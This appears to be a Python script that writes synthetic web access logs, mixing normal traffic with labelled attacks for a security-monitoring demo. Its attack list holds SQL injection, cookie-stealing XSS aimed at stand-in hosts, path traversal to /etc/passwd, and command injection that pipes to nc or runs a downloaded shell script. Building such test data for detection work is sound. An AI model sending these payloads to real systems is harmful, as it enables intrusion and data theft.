# sample_logs.py — Realistic sample log generator for WEB MXDR demo
import json
import os
import random
from datetime import datetime, timezone, timedelta

LOG_FILE = os.path.join(os.path.dirname(__file__), 'logs', 'access.log')

ATTACKER_IPS = [
    '185.220.101.47', '45.142.212.100', '194.165.16.11',
    '103.21.244.0', '222.186.15.201', '91.108.4.0',
    '198.98.56.144', '176.9.22.10',
]
NORMAL_IPS = [
    '203.0.113.10', '198.51.100.5', '192.0.2.100',
    '172.217.5.46', '8.8.4.4', '1.1.1.1',
]
USER_AGENTS = {
    'normal': [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
    ],
    'scanner': [
        'sqlmap/1.7.8#stable (https://sqlmap.org)',
        'Nikto/2.1.6',
        'Mozilla/5.0 (compatible; Nmap Scripting Engine)',
        'python-requests/2.31.0',
        'gobuster/3.6',
    ],
}

ATTACK_SCENARIOS = [
    ('POST', '/login', '{}', '{"username": "\' OR 1=1 --", "password": "anything"}', 'scanner', ['SQLI']),
    ('POST', '/login', '{}', '{"username": "admin\' UNION SELECT username,password FROM users --", "password": "x"}', 'scanner', ['SQLI']),
    ('GET', '/profile', '{"id": "1 OR SLEEP(5)"}', '', 'normal', ['SQLI']),
    ('GET', '/search', '{"q": "1; DROP TABLE users --"}', '', 'scanner', ['SQLI']),
    ('GET', '/item', '{"id": "1 UNION SELECT 1,username,password,4 FROM users"}', '', 'scanner', ['SQLI']),
    ('POST', '/comment', '{}', '{"text": "<script>document.location=\'http://evil.com/steal?c=\'+document.cookie</script>"}', 'normal', ['XSS']),
    ('GET', '/search', '{"q": "<img src=x onerror=alert(document.cookie)>"}', '', 'normal', ['XSS']),
    ('POST', '/profile', '{}', '{"bio": "<svg onload=fetch(\'https://attacker.com/\'+document.cookie)>"}', 'normal', ['XSS']),
    ('GET', '/page', '{"id": "<iframe src=javascript:alert(1)>"}', '', 'normal', ['XSS']),
    ('GET', '/download', '{"file": "../../../../etc/passwd"}', '', 'normal', ['PATH_TRAVERSAL']),
    ('GET', '/file', '{"path": "..%2F..%2F..%2Fetc%2Fshadow"}', '', 'scanner', ['PATH_TRAVERSAL']),
    ('GET', '/assets/../../../etc/passwd', '{}', '', 'normal', ['PATH_TRAVERSAL']),
    ('POST', '/ping', '{}', '{"host": "127.0.0.1; cat /etc/passwd"}', 'normal', ['CMDI']),
    ('POST', '/run', '{}', '{"cmd": "ls | nc attacker.com 4444"}', 'normal', ['CMDI']),
    ('GET', '/exec', '{"input": "$(curl http://evil.com/shell.sh | bash)"}', '', 'scanner', ['CMDI']),
    ('POST', '/login', '{}', '{"username": "admin", "password": "password123"}', 'scanner', ['BRUTE_FORCE']),
    ('POST', '/login', '{}', '{"username": "admin", "password": "admin"}', 'scanner', ['BRUTE_FORCE']),
    ('POST', '/login', '{}', '{"username": "root", "password": "toor"}', 'scanner', ['BRUTE_FORCE']),
    ('POST', '/auth/signin', '{}', '{"username": "admin", "password": "123456"}', 'scanner', ['BRUTE_FORCE']),
    ('GET', '/admin', '{}', '', 'scanner', ['SCANNER']),
    ('GET', '/wp-admin', '{}', '', 'scanner', ['SCANNER']),
    ('GET', '/.env', '{}', '', 'scanner', ['SCANNER']),
    ('GET', '/phpinfo.php', '{}', '', 'scanner', ['SCANNER']),
    ('GET', '/.git/config', '{}', '', 'scanner', ['SCANNER']),
    ('GET', '/backup.zip', '{}', '', 'scanner', ['SCANNER']),
    ('POST', '/login', '{}', '{"username": "admin\' OR 1=1 --<script>alert(1)</script>", "password": "x"}', 'scanner', ['SQLI', 'XSS']),
]

NORMAL_SCENARIOS = [
    ('GET',  '/login',        '{}', '', 'normal'),
    ('GET',  '/dashboard',    '{}', '', 'normal'),
    ('GET',  '/profile',      '{"id": "42"}', '', 'normal'),
    ('POST', '/login',        '{}', '{"username": "john", "password": "securepass"}', 'normal'),
    ('GET',  '/transactions', '{}', '', 'normal'),
    ('GET',  '/static/app.js','{}', '', 'normal'),
    ('GET',  '/favicon.ico',  '{}', '', 'normal'),
    ('GET',  '/api/balance',  '{}', '', 'normal'),
    ('POST', '/transfer',     '{}', '{"to": "ACC123", "amount": "100"}', 'normal'),
    ('GET',  '/logout',       '{}', '', 'normal'),
]

STATUS_MAP = {
    'SQLI':           [200, 500, 403],
    'XSS':            [200, 200, 400],
    'PATH_TRAVERSAL': [200, 403, 404],
    'CMDI':           [200, 500],
    'BRUTE_FORCE':    [401, 401, 401, 302],
    'SCANNER':        [200, 404, 403],
    'normal':         [200, 200, 200, 304, 404],
}

def _ts(minutes_ago: int) -> str:
    t = datetime.now(timezone.utc) - timedelta(minutes=minutes_ago)
    return t.isoformat()

def generate_sample_logs(count: int = 80) -> int:
    os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
    lines = []
    interval = 120 / count

    for i in range(count):
        minutes_ago = int((count - i) * interval)
        if random.random() < 0.60:
            scenario = random.choice(ATTACK_SCENARIOS)
            method, path, query, body, ua_type, hints = scenario
            ip = random.choice(ATTACKER_IPS)
            status = random.choice(STATUS_MAP.get(hints[0], [200, 403, 500]))
        else:
            scenario = random.choice(NORMAL_SCENARIOS)
            method, path, query, body, ua_type = scenario
            hints = []
            ip = random.choice(NORMAL_IPS)
            status = random.choice(STATUS_MAP['normal'])

        entry = {
            'timestamp':    _ts(minutes_ago),
            'ip':           ip,
            'method':       method,
            'path':         path,
            'status':       status,
            'duration_ms':  random.randint(5, 800),
            'user_agent':   random.choice(USER_AGENTS[ua_type]),
            'referer':      '',
            'body':         body,
            'query':        query,
            'attack_hints': hints,
        }
        lines.append(json.dumps(entry))

    with open(LOG_FILE, 'a') as f:
        f.write('\n'.join(lines) + '\n')

    return len(lines)
